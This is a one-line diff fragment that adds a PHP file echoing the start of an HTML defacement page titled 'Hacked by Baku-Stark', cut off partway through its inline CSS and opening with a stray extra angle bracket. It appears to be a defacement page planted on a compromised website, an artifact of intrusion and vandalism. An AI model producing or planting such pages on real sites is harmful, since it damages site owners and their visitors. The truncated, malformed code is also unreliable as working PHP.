@@ -1,0 +1,1 @@
+<<<?php echo '<html><head><title>Hacked by Baku-Stark</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}body{width:100
